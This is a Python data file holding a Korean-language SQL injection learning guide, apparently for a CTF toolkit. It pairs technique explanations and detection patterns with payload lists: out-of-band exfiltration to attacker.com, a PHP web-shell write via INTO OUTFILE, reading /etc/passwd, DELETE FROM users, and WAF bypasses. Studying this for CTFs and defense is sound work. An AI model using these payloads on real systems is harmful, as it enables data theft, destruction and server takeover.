"""SQL Injection (SQLi) Learning Guide."""

SQLI_GUIDE = {
    "attack_type": "sqli",
    "title": "SQL Injection Guide",
    "severity": "critical",
    "difficulty": "intermediate",

    # 개요
    "overview": """SQL Injection(SQLi)은 웹 애플리케이션의 사용자 입력을 통해 악의적인 SQL 쿼리를 삽입하는 공격입니다.
이를 통해 공격자는 데이터베이스를 조회, 수정, 삭제하거나 인증을 우회할 수 있습니다.

SQLi는 OWASP Top 10에서 오랫동안 상위권을 차지하는 가장 위험한 웹 취약점 중 하나입니다.
Prepared Statement 또는 Parameterized Query를 사용하지 않는 동적 쿼리 생성 시 발생합니다.""",

    "impact": [
        "데이터베이스 전체 내용 탈취 (Confidentiality)",
        "데이터 위/변조 또는 삭제 (Integrity)",
        "인증 및 권한 우회 (Authentication Bypass)",
        "서버 장악 가능 (RCE via xp_cmdshell, INTO OUTFILE 등)",
        "다른 시스템으로의 피벗 공격 (Lateral Movement)",
    ],

    "vulnerable_patterns": [
        "query = f\"SELECT * FROM users WHERE id = {user_input}\"",
        "query = \"SELECT * FROM users WHERE id = \" + request.getParameter(\"id\")",
        "$query = \"SELECT * FROM users WHERE id = '\" . $_GET['id'] . \"'\";",
    ],

    # 사전 정찰
    "reconnaissance": {
        "description": "SQLi 테스트 전 수행해야 할 정찰 단계",
        "steps": [
            {
                "step": 1,
                "action": "입력 벡터 식별",
                "details": "URL 파라미터, 폼 필드, 쿠키, HTTP 헤더(User-Agent, Referer, X-Forwarded-For) 등 모든 입력점 파악"
            },
            {
                "step": 2,
                "action": "기술 스택 파악",
                "details": "웹서버, 프레임워크, 데이터베이스 종류 추정 (에러 메시지, 헤더, 확장자 등)"
            },
            {
                "step": 3,
                "action": "WAF 존재 여부 확인",
                "details": "기본 페이로드 차단 여부, 403/406 응답, WAF 시그니처 헤더 확인"
            },
        ]
    },

    # 기술별 가이드
    "techniques": {
        "error_based": {
            "name": "Error-Based SQLi",
            "difficulty": "beginner",
            "how_it_works": """에러 기반 SQLi는 데이터베이스가 반환하는 에러 메시지를 통해 정보를 추출합니다.
SQL 문법 에러를 유도하여 DB 종류, 테이블 구조, 데이터 값 등을 확인할 수 있습니다.
디버그 모드가 활성화되어 있거나 에러가 화면에 출력될 때 효과적입니다.""",
            "prerequisites": [
                "데이터베이스 에러 메시지가 화면에 노출되어야 함",
                "디버그 모드 또는 상세한 에러 핸들링이 설정됨",
            ],
            "payloads": [
                {"payload": "'", "purpose": "기본 문법 에러 테스트", "expected": "SQL syntax error"},
                {"payload": "\"", "purpose": "더블쿼트 테스트", "expected": "SQL syntax error"},
                {"payload": "'--", "purpose": "주석으로 쿼리 종료", "expected": "정상 또는 다른 결과"},
                {"payload": "' OR '1'='1", "purpose": "항상 참 조건", "expected": "모든 데이터 반환"},
                {"payload": "1' AND EXTRACTVALUE(1,CONCAT(0x7e,VERSION()))--", "purpose": "MySQL 버전 추출", "expected": "XPATH syntax error"},
                {"payload": "1' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT(VERSION(),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--", "purpose": "MySQL Double Query", "expected": "Duplicate entry 에러"},
            ],
            "detection_patterns": [
                "SQL syntax error",
                "mysql_fetch",
                "ORA-",
                "Microsoft SQL Native Client error",
                "Unclosed quotation mark",
            ],
            "common_mistakes": [
                "에러 메시지가 없다고 SQLi가 없는 것은 아님 (Blind SQLi 시도 필요)",
                "WAF에 의해 차단될 수 있으므로 인코딩/우회 시도",
            ],
        },

        "union_based": {
            "name": "UNION-Based SQLi",
            "difficulty": "intermediate",
            "how_it_works": """UNION 기반 SQLi는 UNION SELECT 문을 사용하여 추가 쿼리 결과를 원래 결과에 병합합니다.
원본 쿼리의 컬럼 수와 데이터 타입을 맞춰야 합니다.
결과가 화면에 출력되는 경우에만 사용 가능합니다.""",
            "prerequisites": [
                "쿼리 결과가 화면에 출력되어야 함",
                "UNION SELECT가 허용되어야 함",
                "컬럼 수를 파악해야 함",
            ],
            "payloads": [
                {"payload": "' ORDER BY 1--", "purpose": "컬럼 수 파악 (1씩 증가)", "expected": "에러 발생 지점이 컬럼 수"},
                {"payload": "' UNION SELECT NULL--", "purpose": "UNION 가능 여부 테스트", "expected": "에러 없음 또는 결과 변화"},
                {"payload": "' UNION SELECT NULL,NULL,NULL--", "purpose": "3컬럼 테스트", "expected": "결과에 NULL 행 추가"},
                {"payload": "' UNION SELECT 1,2,3--", "purpose": "출력 위치 확인", "expected": "화면에 1,2,3 중 하나 출력"},
                {"payload": "' UNION SELECT username,password,3 FROM users--", "purpose": "데이터 추출", "expected": "사용자 정보 출력"},
                {"payload": "' UNION SELECT table_name,NULL,NULL FROM information_schema.tables--", "purpose": "테이블 목록", "expected": "테이블 이름 출력"},
            ],
            "detection_patterns": [
                "기존과 다른 데이터가 출력됨",
                "행 수가 증가함",
                "숫자/문자가 예상치 못한 위치에 출력됨",
            ],
            "common_mistakes": [
                "컬럼 수가 맞지 않으면 에러 발생 - ORDER BY로 먼저 확인",
                "데이터 타입 불일치 - NULL 사용 또는 CAST 사용",
                "출력 위치 확인 안함 - 모든 컬럼이 출력되는 것은 아님",
            ],
        },

        "blind_boolean": {
            "name": "Boolean-Based Blind SQLi",
            "difficulty": "intermediate",
            "how_it_works": """Boolean Blind SQLi는 참/거짓 조건에 따른 응답 차이를 이용합니다.
직접적인 데이터 출력 없이, 응답의 차이(페이지 내용, 길이, 상태 코드)로 정보를 추론합니다.
한 번에 한 비트씩 정보를 추출하므로 자동화 도구가 필수입니다.""",
            "prerequisites": [
                "참/거짓에 따라 응답이 다르게 나타나야 함",
                "조건문(WHERE)에 입력이 포함되어야 함",
            ],
            "payloads": [
                {"payload": "' AND 1=1--", "purpose": "참 조건 테스트", "expected": "정상 응답"},
                {"payload": "' AND 1=2--", "purpose": "거짓 조건 테스트", "expected": "다른 응답 (빈 결과, 에러 등)"},
                {"payload": "' AND SUBSTRING(@@version,1,1)='5'--", "purpose": "버전 첫 글자 확인", "expected": "참이면 정상 응답"},
                {"payload": "' AND (SELECT COUNT(*) FROM users)>0--", "purpose": "테이블 존재 확인", "expected": "참이면 정상 응답"},
                {"payload": "' AND ASCII(SUBSTRING((SELECT password FROM users LIMIT 1),1,1))>97--", "purpose": "문자 추출 (Binary Search)", "expected": "응답 차이로 문자 특정"},
            ],
            "detection_patterns": [
                "1=1 조건 시 정상 응답, 1=2 조건 시 다른 응답",
                "Content-Length 차이",
                "특정 문자열 존재 여부 차이",
                "HTTP 상태 코드 차이 (200 vs 302)",
            ],
            "common_mistakes": [
                "응답 차이가 미세할 수 있음 - Content-Length 비교",
                "세션/시간에 따른 동적 콘텐츠 - 안정적인 지표 선택",
                "수동 테스트로는 비효율적 - sqlmap 등 자동화 도구 활용",
            ],
        },

        "blind_time": {
            "name": "Time-Based Blind SQLi",
            "difficulty": "advanced",
            "how_it_works": """Time-Based Blind SQLi는 조건에 따라 지연을 발생시켜 정보를 추출합니다.
응답 차이가 전혀 없는 경우에도 사용 가능한 최후의 수단입니다.
네트워크 지연을 고려하여 충분한 시간 차이(5초 이상)를 설정해야 합니다.""",
            "prerequisites": [
                "SLEEP, WAITFOR, BENCHMARK 등 지연 함수 사용 가능",
                "응답 시간 측정 가능",
            ],
            "payloads": [
                {"payload": "' AND SLEEP(5)--", "purpose": "MySQL 지연 테스트", "expected": "5초 지연"},
                {"payload": "'; WAITFOR DELAY '0:0:5'--", "purpose": "MSSQL 지연 테스트", "expected": "5초 지연"},
                {"payload": "' AND (SELECT SLEEP(5) FROM dual WHERE 1=1)--", "purpose": "Oracle 지연 (via DBMS_PIPE)", "expected": "5초 지연"},
                {"payload": "' AND IF(1=1,SLEEP(5),0)--", "purpose": "조건부 지연 (MySQL)", "expected": "조건 참이면 5초 지연"},
                {"payload": "' AND IF(SUBSTRING(@@version,1,1)='5',SLEEP(5),0)--", "purpose": "버전 확인 (MySQL)", "expected": "5이면 지연"},
                {"payload": "' AND (SELECT CASE WHEN (1=1) THEN pg_sleep(5) ELSE pg_sleep(0) END)--", "purpose": "PostgreSQL 조건부 지연", "expected": "조건 참이면 5초 지연"},
            ],
            "detection_patterns": [
                "응답 시간이 설정한 지연 시간만큼 증가",
                "같은 요청의 응답 시간 편차가 큼",
                "특정 조건에서만 지연 발생",
            ],
            "common_mistakes": [
                "네트워크 지연 오탐 - 여러 번 테스트하여 일관성 확인",
                "지연 시간이 너무 짧으면 오탐 가능 - 5초 이상 권장",
                "서버 타임아웃 - 너무 긴 지연은 피함",
            ],
        },

        "second_order": {
            "name": "Second-Order SQLi",
            "difficulty": "advanced",
            "how_it_works": """Second-Order SQLi는 입력 시점이 아닌, 저장된 데이터가 나중에 사용될 때 발생합니다.
예: 회원가입 시 입력한 이름이 프로필 페이지 조회 시 쿼리에 포함되어 실행됨.
입력과 실행 시점이 분리되어 탐지가 어렵습니다.""",
            "prerequisites": [
                "입력 데이터가 DB에 저장됨",
                "저장된 데이터가 나중에 다른 쿼리에 사용됨",
                "두 번째 사용 시점에서 이스케이프 없이 쿼리에 포함됨",
            ],
            "payloads": [
                {"payload": "admin'--", "purpose": "사용자명에 주입 후 로그인 시 동작 확인", "expected": "admin으로 로그인됨"},
                {"payload": "test' OR '1'='1", "purpose": "저장 후 조회 시 모든 데이터 반환", "expected": "추가 데이터 노출"},
                {"payload": "'); DELETE FROM users;--", "purpose": "저장 후 실행 시 데이터 삭제", "expected": "데이터 삭제됨"},
            ],
            "detection_patterns": [
                "회원가입/수정 후 다른 페이지에서 이상 동작",
                "저장된 데이터가 다른 사용자에게 영향",
                "배치 작업 실행 시 에러 발생",
            ],
            "common_mistakes": [
                "입력 시점에서만 테스트하고 끝냄 - 저장 후 여러 기능에서 확인 필요",
                "페이로드가 저장 시 필터링됨 - 인코딩/우회 시도",
            ],
        },

        "out_of_band": {
            "name": "Out-of-Band SQLi",
            "difficulty": "advanced",
            "how_it_works": """Out-of-Band SQLi는 DNS, HTTP 요청 등 외부 채널을 통해 데이터를 추출합니다.
직접 응답에서 데이터를 확인할 수 없을 때 사용합니다.
Burp Collaborator, interactsh 등의 도구로 외부 요청을 수신합니다.""",
            "prerequisites": [
                "서버에서 외부 네트워크 접근이 가능해야 함",
                "DNS 조회 또는 HTTP 요청을 발생시킬 수 있는 함수 사용 가능",
            ],
            "payloads": [
                {"payload": "'; SELECT LOAD_FILE(CONCAT('\\\\\\\\',@@version,'.attacker.com\\\\a'))--", "purpose": "MySQL DNS exfiltration", "expected": "DNS 쿼리에 버전 포함"},
                {"payload": "'; EXEC master..xp_dirtree '\\\\attacker.com\\a'--", "purpose": "MSSQL DNS exfiltration", "expected": "DNS 쿼리 발생"},
                {"payload": "'; SELECT UTL_HTTP.REQUEST('http://attacker.com/'||USER) FROM dual--", "purpose": "Oracle HTTP exfiltration", "expected": "HTTP 요청에 사용자명 포함"},
            ],
            "detection_patterns": [
                "외부 서버에서 DNS 쿼리 수신",
                "HTTP 요청에 데이터 포함",
                "데이터가 subdomain이나 URL path에 포함됨",
            ],
            "common_mistakes": [
                "방화벽에서 외부 접근 차단 - 내부 서버 테스트",
                "DNS 조회만 허용되는 경우 - DNS 기반 공격만 가능",
            ],
        },
    },

    # 체크리스트
    "checklist": [
        {
            "step": 1,
            "action": "입력 포인트 식별",
            "expected_result": "모든 파라미터, 헤더, 쿠키 목록",
            "command_example": "ctf-toolkit recon --url http://target.com",
            "notes": "URL, POST body, JSON, XML, HTTP 헤더 모두 확인"
        },
        {
            "step": 2,
            "action": "기본 SQLi 테스트 (싱글쿼트)",
            "expected_result": "SQL 에러 또는 응답 변화",
            "command_example": "ctf-toolkit sqli scan -u 'http://target.com?id=1'",
            "notes": "', \", --, #, ; 등 기본 특수문자 테스트"
        },
        {
            "step": 3,
            "action": "에러 메시지 분석",
            "expected_result": "DB 종류, 쿼리 구조 파악",
            "command_example": None,
            "notes": "MySQL, MSSQL, Oracle, PostgreSQL 에러 패턴 확인"
        },
        {
            "step": 4,
            "action": "Boolean Blind 테스트",
            "expected_result": "AND 1=1 vs AND 1=2 응답 차이",
            "command_example": "ctf-toolkit sqli scan -u 'http://target.com?id=1' --technique B",
            "notes": "Content-Length, 특정 문자열 존재 여부 비교"
        },
        {
            "step": 5,
            "action": "Time Blind 테스트",
            "expected_result": "SLEEP(5) 시 5초 지연",
            "command_example": "ctf-toolkit sqli scan -u 'http://target.com?id=1' --technique T",
            "notes": "네트워크 지연 고려하여 여러 번 테스트"
        },
        {
            "step": 6,
            "action": "UNION 컬럼 수 파악",
            "expected_result": "정확한 컬럼 수",
            "command_example": None,
            "notes": "ORDER BY 또는 UNION SELECT NULL 증가로 확인"
        },
        {
            "step": 7,
            "action": "DB 버전 및 사용자 확인",
            "expected_result": "MySQL 8.0, root 등",
            "command_example": "ctf-toolkit sqli scan -u 'http://target.com?id=1' --banner",
            "notes": "@@version, VERSION(), USER() 등"
        },
        {
            "step": 8,
            "action": "데이터베이스/테이블 열거",
            "expected_result": "DB 목록, 테이블 목록",
            "command_example": "ctf-toolkit sqli scan -u 'http://target.com?id=1' --dbs",
            "notes": "information_schema 활용"
        },
        {
            "step": 9,
            "action": "컬럼 및 데이터 덤프",
            "expected_result": "사용자 계정, 비밀번호 등",
            "command_example": "ctf-toolkit sqli scan -u 'http://target.com?id=1' -D db -T users --dump",
            "notes": "민감 데이터 우선 추출"
        },
        {
            "step": 10,
            "action": "권한 상승 및 RCE 시도",
            "expected_result": "파일 읽기/쓰기, 명령 실행",
            "command_example": None,
            "notes": "LOAD_FILE, INTO OUTFILE, xp_cmdshell 등"
        },
    ],

    # 탐지 패턴
    "detection_patterns": [
        # Error-based patterns
        {
            "pattern_type": "error_message",
            "indicator": "You have an error in your SQL syntax",
            "confidence": "high",
            "db_specific": "mysql",
            "example_response": "You have an error in your SQL syntax; check the manual..."
        },
        {
            "pattern_type": "error_message",
            "indicator": "mysql_fetch",
            "confidence": "high",
            "db_specific": "mysql",
            "example_response": "Warning: mysql_fetch_array() expects parameter 1..."
        },
        {
            "pattern_type": "error_message",
            "indicator": "ORA-[0-9]+",
            "confidence": "high",
            "db_specific": "oracle",
            "example_response": "ORA-00933: SQL command not properly ended"
        },
        {
            "pattern_type": "error_message",
            "indicator": "Microsoft SQL Native Client error",
            "confidence": "high",
            "db_specific": "mssql",
            "example_response": "Microsoft SQL Native Client error '80040e14'"
        },
        {
            "pattern_type": "error_message",
            "indicator": "Unclosed quotation mark",
            "confidence": "high",
            "db_specific": "mssql",
            "example_response": "Unclosed quotation mark after the character string"
        },
        {
            "pattern_type": "error_message",
            "indicator": "pg_query\\(\\)",
            "confidence": "high",
            "db_specific": "postgresql",
            "example_response": "Warning: pg_query(): Query failed..."
        },
        {
            "pattern_type": "error_message",
            "indicator": "SQLite3::query",
            "confidence": "high",
            "db_specific": "sqlite",
            "example_response": "SQLite3::query(): Unable to prepare statement..."
        },
        # Behavior patterns
        {
            "pattern_type": "behavior",
            "indicator": "1=1 참 조건 시 더 많은 데이터 반환",
            "confidence": "high",
            "db_specific": None,
            "example_response": None
        },
        {
            "pattern_type": "behavior",
            "indicator": "UNION SELECT 시 추가 행 출력",
            "confidence": "high",
            "db_specific": None,
            "example_response": None
        },
        {
            "pattern_type": "behavior",
            "indicator": "Content-Length 변화 (참/거짓 조건)",
            "confidence": "medium",
            "db_specific": None,
            "example_response": None
        },
        # Timing patterns
        {
            "pattern_type": "timing",
            "indicator": "SLEEP(N) 시 N초 응답 지연",
            "confidence": "high",
            "db_specific": "mysql",
            "example_response": None
        },
        {
            "pattern_type": "timing",
            "indicator": "WAITFOR DELAY 시 지연",
            "confidence": "high",
            "db_specific": "mssql",
            "example_response": None
        },
        {
            "pattern_type": "timing",
            "indicator": "pg_sleep(N) 시 N초 응답 지연",
            "confidence": "high",
            "db_specific": "postgresql",
            "example_response": None
        },
        # Status code patterns
        {
            "pattern_type": "status_code",
            "indicator": "500 Internal Server Error (SQL 에러 시)",
            "confidence": "medium",
            "db_specific": None,
            "example_response": None
        },
        {
            "pattern_type": "status_code",
            "indicator": "302 Redirect (인증 우회 시)",
            "confidence": "medium",
            "db_specific": None,
            "example_response": None
        },
    ],

    # WAF 우회
    "waf_bypass": [
        {
            "technique": "주석 삽입 (Comment Injection)",
            "example": "'/**/OR/**/1=1--",
            "effective_against": "Space-based filters"
        },
        {
            "technique": "대소문자 혼합 (Mixed Case)",
            "example": "uNiOn SeLeCt",
            "effective_against": "Case-sensitive filters"
        },
        {
            "technique": "URL 인코딩 (URL Encoding)",
            "example": "%27%20OR%201=1--",
            "effective_against": "Basic input filters"
        },
        {
            "technique": "더블 URL 인코딩",
            "example": "%252f → /",
            "effective_against": "Single-decode filters"
        },
        {
            "technique": "Hex 인코딩",
            "example": "0x61646D696E → admin",
            "effective_against": "String filters"
        },
        {
            "technique": "개행 문자 사용",
            "example": "UN%0aION SELECT",
            "effective_against": "Keyword filters"
        },
        {
            "technique": "인라인 주석",
            "example": "UN/*!ION*/ SE/*!LECT*/",
            "effective_against": "MySQL specific bypass"
        },
        {
            "technique": "문자열 연결",
            "example": "CONCAT('sel','ect')",
            "effective_against": "Keyword blacklists"
        },
    ],

    # CTF 팁
    "ctf_tips": [
        "로그인 폼에서 admin'-- 또는 admin'/*로 인증 우회 시도",
        "ORDER BY로 빠르게 컬럼 수 파악 후 UNION 공격",
        "에러가 안 보이면 바로 Time-based로 전환",
        "information_schema.tables, information_schema.columns 필수 암기",
        "MySQL: @@version, database(), user() / MSSQL: @@version, db_name(), user_name()",
        "LIMIT 0,1 또는 OFFSET 0 FETCH NEXT 1 ROWS ONLY로 한 행씩 추출",
        "필터링 시 /**/로 공백 대체, %00 (Null byte) 시도",
        "파일 읽기: LOAD_FILE('/etc/passwd') 또는 UTL_FILE",
        "웹쉘 업로드: SELECT '<?php system($_GET[c]);?>' INTO OUTFILE '/var/www/shell.php'",
        "sqlmap은 --level=5 --risk=3 옵션으로 더 많은 페이로드 시도",
        "Second-order SQLi: 회원가입 시 페이로드 입력 후 다른 기능에서 확인",
        "Stacked queries 가능 시: ; DELETE FROM users-- 주의!",
    ],
}
